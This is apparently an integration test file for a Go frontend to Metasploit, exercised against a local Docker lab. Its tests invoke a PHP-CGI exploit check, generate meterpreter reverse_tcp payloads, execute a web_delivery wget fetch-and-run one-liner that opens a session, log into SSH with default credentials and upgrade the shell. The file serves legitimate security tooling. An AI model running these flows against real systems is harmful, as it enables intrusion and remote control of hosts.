//go:build integration

package engine

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/jolovicdev/hayduk/internal/protocol"
)

// stagingDirForTest is the directory the lab's msf container bind-mounts at
// the same path (scripts/msf/compose.yaml). Tests that transfer bytes skip
// when it is absent.
func stagingDirForTest(t *testing.T) string {
	t.Helper()
	dir := envOr("HAYDUK_STAGING", "/tmp/hayduk-staging")
	if info, err := os.Stat(dir); err != nil || !info.IsDir() {
		t.Skipf("staging dir %s missing; start the lab with scripts/msf/up.sh", dir)
	}
	return dir
}

func postEngine(t *testing.T, staging string) *Engine {
	t.Helper()
	e := New(Config{StagingDir: staging})
	t.Cleanup(e.Shutdown)
	if err := e.Connect(context.Background(), integrationEnv(t)); err != nil {
		t.Fatalf("connect: %+v", err)
	}
	return e
}

func waitSession(t *testing.T, e *Engine, match func(*protocol.SessionState) bool, timeout time.Duration) string {
	t.Helper()
	deadline := time.After(timeout)
	for {
		for sid, s := range e.State().Sessions {
			if s != nil && match(s) {
				return sid
			}
		}
		select {
		case <-deadline:
			t.Fatalf("no matching session within %v; sessions: %+v", timeout, e.State().Sessions)
		case <-time.After(200 * time.Millisecond):
		}
	}
}

// The check verdict travels through a real utility console against a real
// service: dvwa's Apache answers the PHP-CGI check even when it says safe.
func TestIntegrationModuleCheckLive(t *testing.T) {
	target := os.Getenv("MSF_SCAN_TARGET")
	if target == "" {
		t.Skip("MSF_SCAN_TARGET not set")
	}
	e := postEngine(t, "")
	raw, eb := e.Exec(context.Background(), "integration-op", protocol.MethodModuleCheck, json.RawMessage(`{
		"type":"exploit","name":"multi/http/php_cgi_arg_injection",
		"options":{"RHOSTS":"`+target+`","RPORT":80,"TARGETURI":"/"}}`))
	if eb != nil {
		t.Fatalf("module.check: %+v", eb)
	}
	var payload protocol.ModuleCheckPayload
	if err := json.Unmarshal(raw, &payload); err != nil {
		t.Fatal(err)
	}
	switch payload.Status {
	case "vulnerable", "appears", "safe", "unsupported", "detected", "unknown":
	default:
		t.Fatalf("status %q outside the verdict vocabulary", payload.Status)
	}
	if payload.Message == "" || !strings.ContainsAny(payload.Output, "[") {
		t.Fatalf("check produced no console output: %+v", payload)
	}
	t.Logf("check verdict: %s — %s", payload.Status, payload.Message)
}

// Payload bytes ride the RPC reply: an ELF generated against a remote-style
// daemon must arrive intact, not as a path on the msfrpcd host.
func TestIntegrationPayloadGenerateBytes(t *testing.T) {
	e := postEngine(t, "")
	raw, eb := e.Exec(context.Background(), "", protocol.MethodPayloadGenerate, json.RawMessage(`{
		"payload":"linux/x64/meterpreter/reverse_tcp","format":"elf",
		"options":{"LHOST":"127.0.0.1","LPORT":4444}}`))
	if eb != nil {
		t.Fatalf("payload.generate: %+v", eb)
	}
	var payload protocol.PayloadGeneratePayload
	if err := json.Unmarshal(raw, &payload); err != nil {
		t.Fatal(err)
	}
	data, err := base64.StdEncoding.DecodeString(payload.DataBase64)
	if err != nil {
		t.Fatalf("dataBase64: %v", err)
	}
	if len(data) < 64 || string(data[:4]) != "\x7fELF" {
		t.Fatalf("generated artifact is not an ELF (%d bytes, header %q)", len(data), data[:4])
	}
	if payload.SavedPath != "" || payload.Size != len(data) {
		t.Fatalf("payload %+v", payload)
	}
}

func TestIntegrationWorkspaceAddDeleteLive(t *testing.T) {
	e := postEngine(t, "")
	const name = "hayduk-it-post"
	if _, eb := e.Exec(context.Background(), "", protocol.MethodWorkspaceAdd,
		json.RawMessage(`{"name":"`+name+`"}`)); eb != nil {
		t.Fatalf("workspace.add: %+v", eb)
	}
	raw, eb := e.Exec(context.Background(), "", protocol.MethodWorkspaceList, nil)
	if eb != nil {
		t.Fatalf("workspace.list: %+v", eb)
	}
	var names []string
	if err := json.Unmarshal(raw, &names); err != nil {
		t.Fatal(err)
	}
	found := false
	for _, n := range names {
		if n == name {
			found = true
		}
	}
	if !found {
		t.Fatalf("created workspace missing from %v", names)
	}
	if _, eb := e.Exec(context.Background(), "", protocol.MethodWorkspaceDelete,
		json.RawMessage(`{"name":"`+name+`"}`)); eb != nil {
		t.Fatalf("workspace.delete: %+v", eb)
	}
}

// The full delivery loop against the live lab: web_delivery serves an ELF,
// the module's own one-liner runs on this machine, the callback opens a
// meterpreter session, and browser-style file transfers round-trip through
// the shared staging directory. Requires the lab (up.sh --with-vulnbox).
func TestIntegrationWebDeliveryCallbackAndTransfers(t *testing.T) {
	staging := stagingDirForTest(t)
	callback := os.Getenv("MSF_CALLBACK_HOST")
	if callback == "" {
		t.Skip("MSF_CALLBACK_HOST not set (the msf container's docker-network address)")
	}
	e := postEngine(t, staging)
	if e.State().Connection.FileStaging != "local" {
		t.Fatalf("fileStaging %q, want local", e.State().Connection.FileStaging)
	}

	// the daemon runs in a container: both the delivery server and the
	// handler must bind its docker-network address, which this host reaches
	// over the bridge
	raw, eb := e.Exec(context.Background(), "integration-op", protocol.MethodWebDelivery, json.RawMessage(`{
		"payload":"linux/x64/meterpreter/reverse_tcp","target":"linux",
		"lhost":"`+callback+`","lport":4444,"srvPort":8080,"srvHost":"`+callback+`"}`))
	if eb != nil {
		t.Fatalf("web.delivery: %+v", eb)
	}
	var delivery protocol.WebDeliveryPayload
	if err := json.Unmarshal(raw, &delivery); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		if delivery.JobID > 0 {
			_, _ = e.Exec(context.Background(), "", protocol.MethodJobStop,
				json.RawMessage(`{"id":"`+strconv.Itoa(delivery.JobID)+`"}`))
		}
	})
	if !strings.HasPrefix(delivery.Command, "wget -qO ") || !strings.Contains(delivery.Command, delivery.URL) {
		t.Fatalf("one-liner %q does not fetch %q", delivery.Command, delivery.URL)
	}

	// the server hands out the raw ELF to anyone who asks
	resp, err := http.Get(delivery.URL)
	if err != nil {
		t.Fatalf("delivery GET: %v", err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	// the linux reverse_tcp payload is a small stager ELF; the magic and a
	// sane minimum size are the contract, not a multi-KB artifact
	if resp.StatusCode != 200 || len(body) < 64 || string(body[:4]) != "\x7fELF" {
		t.Fatalf("delivery served status %d, %d bytes, header %q", resp.StatusCode, len(body), body[:4])
	}

	// run the module's one-liner here; the callback lands in the lab daemon.
	// Use bash (dash has no `disown` builtin) and redirect output to a regular
	// file rather than CombinedOutput's pipe: the backgrounded payload inherits
	// stdout/stderr and would otherwise hold the pipe open forever.
	runDir := t.TempDir()
	logFile, err := os.CreateTemp(runDir, "oneliner-*.log")
	if err != nil {
		t.Fatal(err)
	}
	cmd := exec.Command("bash", "-c", delivery.Command)
	cmd.Dir = runDir
	cmd.Stdout = logFile
	cmd.Stderr = logFile
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	if err := cmd.Start(); err != nil {
		_ = logFile.Close()
		t.Fatalf("one-liner start: %v", err)
	}
	pgid := cmd.Process.Pid
	t.Cleanup(func() { _ = syscall.Kill(-pgid, syscall.SIGKILL) })
	if err := cmd.Wait(); err != nil {
		_ = logFile.Close()
		out, _ := os.ReadFile(logFile.Name())
		t.Fatalf("one-liner failed: %v\n%s", err, out)
	}
	_ = logFile.Close()
	sid := waitSession(t, e, func(s *protocol.SessionState) bool {
		return s.Type == "meterpreter" && strings.Contains(s.ViaExploit, "web_delivery")
	}, 90*time.Second)
	t.Cleanup(func() {
		_, _ = e.Exec(context.Background(), "", protocol.MethodSessionStop, json.RawMessage(`{"sid":"`+sid+`"}`))
	})
	if _, eb := e.Exec(context.Background(), "", protocol.MethodSessionAttach, json.RawMessage(`{"sid":"`+sid+`"}`)); eb != nil {
		t.Fatalf("attach: %+v", eb)
	}

	// browse the session's working directory
	raw, eb = e.Exec(context.Background(), "", protocol.MethodSessionFsList, json.RawMessage(`{"sid":"`+sid+`"}`))
	if eb != nil {
		t.Fatalf("fs_list: %+v", eb)
	}
	var listing protocol.FsListPayload
	if err := json.Unmarshal(raw, &listing); err != nil {
		t.Fatal(err)
	}
	if listing.Path == "" || listing.Separator == "" {
		t.Fatalf("listing %+v", listing)
	}

	// upload known bytes to a fixed remote path, download them back, compare
	content := "hayduk integration transfer \x00\xff\n"
	remote := "/tmp/hayduk-it-transfer.txt"
	t.Cleanup(func() { _ = os.Remove(remote) })
	if _, eb := e.Exec(context.Background(), "", protocol.MethodSessionFileUpload, json.RawMessage(`{
		"sid":"`+sid+`","path":"`+remote+`",
		"dataBase64":"`+base64.StdEncoding.EncodeToString([]byte(content))+`"}`)); eb != nil {
		t.Fatalf("file_upload: %+v", eb)
	}
	raw, eb = e.Exec(context.Background(), "", protocol.MethodSessionFileDownload, json.RawMessage(`{
		"sid":"`+sid+`","path":"`+remote+`"}`))
	if eb != nil {
		t.Fatalf("file_download: %+v", eb)
	}
	var transfer protocol.FileTransferPayload
	if err := json.Unmarshal(raw, &transfer); err != nil {
		t.Fatal(err)
	}
	got, err := base64.StdEncoding.DecodeString(transfer.DataBase64)
	if err != nil || string(got) != content {
		t.Fatalf("round-trip mismatch: %q (%v)", got, err)
	}

	// a post module runs through the session channel and streams its output
	if _, eb := e.Exec(context.Background(), "", protocol.MethodSessionPost, json.RawMessage(`{
		"sid":"`+sid+`","module":"linux/gather/checkvm"}`)); eb != nil {
		t.Fatalf("session.post: %+v", eb)
	}
	deadline := time.After(60 * time.Second)
	for {
		if out := e.State().Interact.Output; strings.Contains(out, "virtual machine") {
			break
		}
		select {
		case <-deadline:
			t.Fatalf("post module output never arrived; transcript tail: %q", tail(e.State().Interact.Output))
		case <-time.After(200 * time.Millisecond):
		}
	}
}

// SSH login opens a shell, the upgrade turns it into meterpreter, and the
// file tools work on the target. Requires MSF_SSH_TARGET (sshbox) and
// MSF_CALLBACK_HOST (the msf container's docker-network address).
func TestIntegrationSSHUpgradeAndFileTools(t *testing.T) {
	target := os.Getenv("MSF_SSH_TARGET")
	callback := os.Getenv("MSF_CALLBACK_HOST")
	if target == "" || callback == "" {
		t.Skip("MSF_SSH_TARGET / MSF_CALLBACK_HOST not set")
	}
	staging := stagingDirForTest(t)
	e := postEngine(t, staging)

	_, eb := e.Exec(context.Background(), "integration-op", protocol.MethodModuleExecute, json.RawMessage(`{
		"type":"auxiliary","name":"scanner/ssh/ssh_login",
		"options":{"RHOSTS":"`+target+`","RPORT":2222,"USERNAME":"msfadmin","PASSWORD":"msfadmin","STOP_ON_SUCCESS":true}}`))
	if eb != nil {
		t.Fatalf("ssh_login: %+v", eb)
	}
	shellSID := waitSession(t, e, func(s *protocol.SessionState) bool { return s.Type == "shell" }, 90*time.Second)
	t.Cleanup(func() {
		_, _ = e.Exec(context.Background(), "", protocol.MethodSessionStop, json.RawMessage(`{"sid":"`+shellSID+`"}`))
	})

	if _, eb := e.Exec(context.Background(), "", protocol.MethodSessionUpgrade, json.RawMessage(`{
		"sid":"`+shellSID+`","lhost":"`+callback+`","lport":4445}`)); eb != nil {
		t.Fatalf("upgrade: %+v", eb)
	}
	metSID := waitSession(t, e, func(s *protocol.SessionState) bool { return s.Type == "meterpreter" }, 90*time.Second)
	t.Cleanup(func() {
		_, _ = e.Exec(context.Background(), "", protocol.MethodSessionStop, json.RawMessage(`{"sid":"`+metSID+`"}`))
	})

	raw, eb := e.Exec(context.Background(), "", protocol.MethodSessionFsList, json.RawMessage(`{"sid":"`+metSID+`","path":"/tmp"}`))
	if eb != nil {
		t.Fatalf("fs_list /tmp: %+v", eb)
	}
	var listing protocol.FsListPayload
	if err := json.Unmarshal(raw, &listing); err != nil {
		t.Fatal(err)
	}
	if listing.Path != "/tmp" {
		t.Fatalf("listing path %q", listing.Path)
	}

	content := []byte("sshbox transfer proof\n")
	if _, eb := e.Exec(context.Background(), "", protocol.MethodSessionFileUpload, json.RawMessage(`{
		"sid":"`+metSID+`","path":"/tmp/hayduk-it-ssh.txt",
		"dataBase64":"`+base64.StdEncoding.EncodeToString(content)+`"}`)); eb != nil {
		t.Fatalf("upload: %+v", eb)
	}
	raw, eb = e.Exec(context.Background(), "", protocol.MethodSessionFileDownload, json.RawMessage(`{
		"sid":"`+metSID+`","path":"/tmp/hayduk-it-ssh.txt"}`))
	if eb != nil {
		t.Fatalf("download: %+v", eb)
	}
	var transfer protocol.FileTransferPayload
	if err := json.Unmarshal(raw, &transfer); err != nil {
		t.Fatal(err)
	}
	got, err := base64.StdEncoding.DecodeString(transfer.DataBase64)
	if err != nil || string(got) != string(content) {
		t.Fatalf("sshbox round-trip: %q (%v)", got, err)
	}
}

func tail(s string) string {
	if len(s) > 400 {
		return s[len(s)-400:]
	}
	return s
}
